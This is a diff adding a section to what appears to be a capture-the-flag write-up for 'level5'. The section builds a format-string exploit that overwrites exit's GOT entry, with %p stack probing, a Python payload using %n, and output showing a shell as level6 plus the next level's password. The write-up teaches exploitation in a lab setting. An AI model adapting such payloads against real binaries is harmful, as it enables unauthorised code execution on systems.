@@ -58,3 +58,31 @@ Continuing.
 $ whoami
 level5
 ```
+
+This works. So the goal now is to do it though the format string attack on the
+printf call. This is basically the same exploit as is in the last level except
+that the _m_ address is replaced with exit's got address.
+
+We start getting to our buffer from the fourth conversion:
+
+```
+./level5
+aaaabbbbccccddddeeeefghijklm %p %p %p %p
+aaaabbbbccccddddeeeefghijklm 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161
+```
+
+Now we simply adapt the last level's exploit for this binary:
+
+```shell
+# feed the exploit payload to the binary
+python -c 'print "\x08\x04\x84\x7f"[::-1] + 4 * "a" + "\x08\x04\x98\x38"[::-1] + "%p%p%p%0*p%n"' | ./level5
+# it works ;)
+whoami
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+
+The first four bytes are the length to add to printfs's return value to return
+_o_'s address. After the padding we have the location of exit's got address and
+finally the format string to pop our values from the stack.
